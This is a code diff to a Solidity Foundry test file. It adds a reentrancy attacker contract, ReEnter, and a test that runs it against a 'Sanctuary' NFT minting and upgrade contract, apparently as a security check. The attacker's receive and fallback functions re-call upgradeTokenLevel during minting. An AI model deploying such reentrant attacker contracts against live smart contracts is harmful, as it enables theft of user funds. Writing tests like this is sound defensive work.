@@ -87,7 +87,7 @@ abstract contract TestBase is Test {
 
     function _initShared() internal {
         _levelPrices[0] = 0;
-        _levelPrices[1] = 0;
+        _levelPrices[1] = 333000000000000000;
         _levelPrices[2] = 333000000000000000;
         _levelPrices[3] = 633000000000000000;
         _levelPrices[3] = 963000000000000000;
@@ -238,5 +238,71 @@ abstract contract TestBase is Test {
             }
         }
         return arr;
+    }
+}
+
+contract ReEnter {
+    Sanctuary sanctuary;
+    uint256[] tokens = [3330, 3331, 3332];
+    uint256 _cur = 0;
+    uint256 _new = 1;
+    ITokenLevels.TokenLevel level = ITokenLevels.TokenLevel(_new);
+    uint256 val;
+
+    constructor(address payable _sanctuary, uint256 _val) {
+        sanctuary = Sanctuary(_sanctuary);
+        val = _val;
+    }
+
+    function attack() public payable {
+        // Mint the Tokens
+        sanctuary.mintWith3UnboundSanOrigin{value: val}(tokens, level);
+    }
+
+    // Function to receive Ether. msg.data must be empty
+    receive() external payable {
+        sanctuary.upgradeTokenLevel{value: 0}(tokens[0], ITokenLevels.TokenLevel(0 + 1));
+    }
+
+    // // Fallback function is called when msg.data is not empty
+    fallback() external payable {
+        for (uint256 i = 0; i < tokens.length; i++) {
+            // sanctuary.mintWith3UnboundSanOrigin{value: val}(tokens, level);
+            sanctuary.upgradeTokenLevel{value: val}(tokens[0], ITokenLevels.TokenLevel(_new + 1));
+        }
+    }
+}
+
+contract TestReEnter is TestBase {
+    ReEnter renter;
+    address renterAddress;
+    address user;
+    address[] users;
+    uint256 _cur = 0;
+    uint256 _new = 1;
+    ITokenLevels.TokenLevel level = ITokenLevels.TokenLevel(_new);
+
+    function setUp() public {
+        user = makeAddr("Attacker");
+        users.push(user);
+        _setUp(users, false);
+        mockERC721Single.transferAll(user, 40, 10000);
+        vm.stopPrank();
+        vm.startPrank(user);
+        renter = new ReEnter(payable(SANCTUARY_ADDRESS), _getPrice(_new, _cur));
+        renterAddress = address(renter);
+        vm.deal(renterAddress, 100 ether);
+
+        mockSanOrigin.batchTransferFrom(user, renterAddress, notBoundTokens);
+    }
+
+    function testAttack() public payable {
+        vm.stopPrank();
+        vm.startPrank(renterAddress);
+        _approveAllTokens(notBoundTokens);
+        renter.attack();
+
+        _checkAfterMint(notBoundTokens, expectedMultiple, level, renterAddress);
+        _checkMusicBoxTokenLevel(IMusicBox.MusicBoxLevel.Rare, expectedSingle, renterAddress);
     }
 }
